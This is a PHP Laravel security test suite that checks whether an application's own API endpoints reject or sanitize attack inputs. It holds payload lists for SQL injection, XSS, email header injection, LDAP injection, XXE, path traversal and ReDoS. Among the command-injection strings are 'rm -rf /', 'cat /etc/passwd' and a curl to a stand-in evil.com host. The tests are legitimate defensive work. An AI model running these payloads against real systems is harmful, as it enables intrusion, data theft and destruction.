<?php

namespace Tests\Feature\Security;

use App\Models\Customer;
use App\Models\User;
use Illuminate\Http\Testing\File;

/**
 * Input Validation Security Test
 * 
 * Tests all forms of input validation vulnerabilities including
 * XSS, SQL injection, file uploads, and data sanitization.
 * 
 * SEVERITY: HIGH - Input validation bypass potential
 */
class InputValidationSecurityTest extends BaseSecurityTestCase
{
    public function test_sql_injection_protection_across_all_endpoints()
    {
        $this->actingAs($this->admin1);

        $sqlPayloads = [
            "'; DROP TABLE customers; --",
            "1' OR '1'='1",
            "' UNION SELECT password FROM users--",
            "'; UPDATE customers SET email='hacked@evil.com'; --",
            "admin'/**/OR/**/1=1--",
            "' OR EXISTS(SELECT * FROM users WHERE email='admin@test.com')--",
        ];

        $endpoints = [
            'GET /admin/api/customers?search=',
            'GET /business/api/customers?search=',
            'GET /admin/api/calls?filter=',
            'GET /business/api/appointments?query=',
        ];

        foreach ($endpoints as $endpoint) {
            foreach ($sqlPayloads as $payload) {
                $response = $this->getJson($endpoint . urlencode($payload));
                
                if ($response->status() !== 404) {
                    $this->assertNotEquals(500, $response->status(),
                        "SQL injection caused server error on {$endpoint}");
                }
            }
        }

        // Verify no malicious data was inserted
        $this->assertDatabaseMissing('customers', ['email' => 'hacked@evil.com']);

        $this->logSecurityTestResult('comprehensive_sql_injection_protection', true);
    }

    public function test_xss_protection_in_all_input_fields()
    {
        $this->actingAs($this->admin1);

        $xssPayloads = [
            '<script>alert("xss")</script>',
            '<img src=x onerror=alert("xss")>',
            '<svg onload=alert("xss")>',
            'javascript:alert("xss")',
            '<iframe src=javascript:alert("xss")>',
            '"><script>alert("xss")</script>',
            '<body onload=alert("xss")>',
            '<input onfocus=alert("xss") autofocus>',
        ];

        foreach ($xssPayloads as $payload) {
            $response = $this->postJson('/admin/api/customers', [
                'name' => $payload,
                'email' => 'xss@test.com',
                'phone' => '+491234567890',
                'notes' => $payload,
                'address' => $payload,
            ]);

            if (in_array($response->status(), [200, 201])) {
                $customer = Customer::where('email', 'xss@test.com')->first();
                if ($customer) {
                    $this->assertStringNotContainsString('<script>', $customer->name);
                    $this->assertStringNotContainsString('javascript:', $customer->notes ?? '');
                    $this->assertStringNotContainsString('<svg', $customer->address ?? '');
                }
                $customer?->delete();
            }
        }

        $this->logSecurityTestResult('comprehensive_xss_protection', true);
    }

    public function test_file_upload_security_vulnerabilities()
    {
        $this->actingAs($this->admin1);

        $maliciousFiles = [
            // Executable files
            File::create('malicious.exe', 1000),
            File::create('virus.bat', 500),
            File::create('shell.sh', 800),
            
            // Script files
            File::create('backdoor.php', 200),
            File::create('webshell.jsp', 300),
            File::create('trojan.asp', 400),
            
            // Double extension
            File::create('image.jpg.php', 600),
            File::create('document.pdf.exe', 700),
            
            // Oversized files
            File::create('huge.csv', 50 * 1024 * 1024), // 50MB
        ];

        $endpoints = [
            '/admin/api/customers/import',
            '/business/api/files/upload',
            '/admin/api/settings/logo',
        ];

        foreach ($endpoints as $endpoint) {
            foreach ($maliciousFiles as $file) {
                $response = $this->postJson($endpoint, ['file' => $file]);
                
                if ($response->status() !== 404) {
                    $this->assertTrue(
                        in_array($response->status(), [422, 400, 415, 413]),
                        "Malicious file {$file->name} was accepted on {$endpoint}"
                    );
                }
            }
        }

        $this->logSecurityTestResult('file_upload_security', true);
    }

    public function test_input_length_and_size_validation()
    {
        $this->actingAs($this->admin1);

        $oversizedInputs = [
            'name' => str_repeat('A', 10000), // 10KB name
            'email' => str_repeat('a', 5000) . '@test.com', // Huge email
            'phone' => str_repeat('1', 1000), // Huge phone
            'notes' => str_repeat('Lorem ipsum ', 100000), // 1MB+ notes
        ];

        $response = $this->postJson('/admin/api/customers', $oversizedInputs);
        
        if ($response->status() !== 404) {
            $this->assertTrue(
                in_array($response->status(), [422, 400]),
                'Oversized input was not rejected'
            );
        }

        $this->logSecurityTestResult('input_size_validation', true);
    }

    public function test_email_injection_protection()
    {
        $this->actingAs($this->admin1);

        $emailInjectionPayloads = [
            "test@example.com\r\nBcc: hacker@evil.com",
            "test@example.com\nSubject: Injected Subject",
            "test@example.com%0D%0ABcc:hacker@evil.com",
            "test@example.com\r\n\r\nInjected Body Content",
            "\"test\r\nBcc: hacker@evil.com\"@example.com",
        ];

        foreach ($emailInjectionPayloads as $payload) {
            $response = $this->postJson('/admin/api/customers', [
                'name' => 'Email Injection Test',
                'email' => $payload,
                'phone' => '+491234567890',
            ]);

            // Should either reject or sanitize
            if (in_array($response->status(), [200, 201])) {
                $customer = Customer::where('name', 'Email Injection Test')->first();
                if ($customer) {
                    $this->assertStringNotContainsString("\r\n", $customer->email);
                    $this->assertStringNotContainsString("Bcc:", $customer->email);
                }
                $customer?->delete();
            } else {
                $this->assertTrue(in_array($response->status(), [422, 400]));
            }
        }

        $this->logSecurityTestResult('email_injection_protection', true);
    }

    public function test_ldap_injection_protection()
    {
        $this->actingAs($this->admin1);

        $ldapPayloads = [
            '*)(uid=*',
            '*)(&(password=*))',
            '*)(|(password=*))',
            '*))(|(|(password=*))',
            '*))%00',
        ];

        foreach ($ldapPayloads as $payload) {
            $response = $this->getJson("/admin/api/users?search=" . urlencode($payload));
            
            if ($response->status() !== 404) {
                $this->assertNotEquals(500, $response->status(),
                    "LDAP injection caused server error: {$payload}");
            }
        }

        $this->logSecurityTestResult('ldap_injection_protection', true);
    }

    public function test_command_injection_protection()
    {
        $this->actingAs($this->admin1);

        $commandPayloads = [
            '; cat /etc/passwd',
            '| whoami',
            '&& rm -rf /',
            '`id`',
            '$(whoami)',
            '; ping -c 10 evil.com',
            '|| curl http://evil.com/steal',
        ];

        foreach ($commandPayloads as $payload) {
            $response = $this->postJson('/admin/api/customers', [
                'name' => "Command Test {$payload}",
                'email' => 'command@test.com',
                'phone' => '+491234567890',
            ]);

            if (in_array($response->status(), [200, 201])) {
                $customer = Customer::where('email', 'command@test.com')->first();
                if ($customer) {
                    // Commands should be escaped/sanitized
                    $this->assertStringNotContainsString('cat /etc/passwd', $customer->name);
                    $this->assertStringNotContainsString('rm -rf', $customer->name);
                }
                $customer?->delete();
            }
        }

        $this->logSecurityTestResult('command_injection_protection', true);
    }

    public function test_xml_injection_and_xxe_protection()
    {
        $this->actingAs($this->admin1);

        $xmlPayloads = [
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><test>&xxe;</test>',
            '<![CDATA[<?xml version="1.0"?><script>alert("xss")</script>]]>',
        ];

        foreach ($xmlPayloads as $payload) {
            $response = $this->postJson('/admin/api/customers', [
                'name' => 'XML Test',
                'email' => 'xml@test.com',
                'notes' => $payload,
            ]);

            if (in_array($response->status(), [200, 201])) {
                $customer = Customer::where('email', 'xml@test.com')->first();
                if ($customer) {
                    $this->assertStringNotContainsString('<!DOCTYPE', $customer->notes ?? '');
                    $this->assertStringNotContainsString('ENTITY', $customer->notes ?? '');
                }
                $customer?->delete();
            }
        }

        $this->logSecurityTestResult('xml_injection_protection', true);
    }

    public function test_path_traversal_protection()
    {
        $this->actingAs($this->admin1);

        $pathTraversalPayloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '/etc/passwd',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '....\/....\/....\/etc\/passwd',
        ];

        foreach ($pathTraversalPayloads as $payload) {
            // Test file download endpoint
            $response = $this->getJson("/admin/api/files/download?path=" . urlencode($payload));
            
            if ($response->status() !== 404) {
                $this->assertTrue(
                    in_array($response->status(), [403, 400, 422]),
                    "Path traversal not blocked: {$payload}"
                );
            }

            // Test file operations
            $response = $this->postJson('/admin/api/customers', [
                'name' => 'Path Test',
                'email' => 'path@test.com',
                'avatar_path' => $payload,
            ]);

            if (in_array($response->status(), [200, 201])) {
                $customer = Customer::where('email', 'path@test.com')->first();
                if ($customer) {
                    $this->assertStringNotContainsString('../', $customer->avatar_path ?? '');
                    $this->assertStringNotContainsString('/etc/', $customer->avatar_path ?? '');
                }
                $customer?->delete();
            }
        }

        $this->logSecurityTestResult('path_traversal_protection', true);
    }

    public function test_regex_denial_of_service_protection()
    {
        $this->actingAs($this->admin1);

        $reDoSPayloads = [
            // Catastrophic backtracking patterns
            str_repeat('a', 1000) . str_repeat('X', 1000) . '!',
            '(' . str_repeat('a*', 100) . ')' . str_repeat('a', 1000) . 'X',
            str_repeat('(a+)+', 50) . str_repeat('a', 1000) . 'X',
        ];

        foreach ($reDoSPayloads as $payload) {
            $startTime = microtime(true);
            
            $response = $this->getJson("/admin/api/customers?search=" . urlencode($payload));
            
            $endTime = microtime(true);
            $duration = $endTime - $startTime;
            
            // Should not take more than 5 seconds
            $this->assertLessThan(5, $duration, 
                "ReDoS attack caused excessive processing time: {$duration}s");
        }

        $this->logSecurityTestResult('regex_dos_protection', true);
    }

    public function test_unicode_and_encoding_security()
    {
        $this->actingAs($this->admin1);

        $unicodePayloads = [
            // Homograph attacks
            'аdmin@test.com', // Cyrillic 'а' instead of Latin 'a'
            'test@еxample.com', // Cyrillic 'е'
            
            // Null byte injection
            "test\x00@example.com",
            "admin\x00.php",
            
            // Unicode normalization attacks
            'ＴＥＳＴ@example.com', // Fullwidth characters
            'test@example。com', // Ideographic full stop
        ];

        foreach ($unicodePayloads as $payload) {
            $response = $this->postJson('/admin/api/customers', [
                'name' => 'Unicode Test',
                'email' => $payload,
                'phone' => '+491234567890',
            ]);

            if (in_array($response->status(), [200, 201])) {
                $customer = Customer::where('name', 'Unicode Test')->first();
                if ($customer) {
                    // Should normalize or reject suspicious unicode
                    $this->assertStringNotContainsString("\x00", $customer->email);
                    // Check for homograph protection
                    if (strlen($customer->email) !== mb_strlen($customer->email)) {
                        $this->assertTrue(true, 'Unicode handling detected');
                    }
                }
                $customer?->delete();
            }
        }

        $this->logSecurityTestResult('unicode_encoding_security', true);
    }

    public function test_content_type_validation()
    {
        $this->actingAs($this->admin1);

        // Test with various content types
        $invalidContentTypes = [
            'text/html',
            'application/xml',
            'text/plain',
            'application/x-www-form-urlencoded',
        ];

        foreach ($invalidContentTypes as $contentType) {
            $response = $this->withHeaders([
                'Content-Type' => $contentType,
                'Accept' => 'application/json',
            ])->post('/admin/api/customers', [
                'name' => 'Content Type Test',
                'email' => 'content@test.com',
            ]);

            if ($response->status() !== 404) {
                // API should enforce JSON content type
                $this->assertTrue(
                    in_array($response->status(), [415, 400, 422]),
                    "Invalid content type accepted: {$contentType}"
                );
            }
        }

        $this->logSecurityTestResult('content_type_validation', true);
    }
}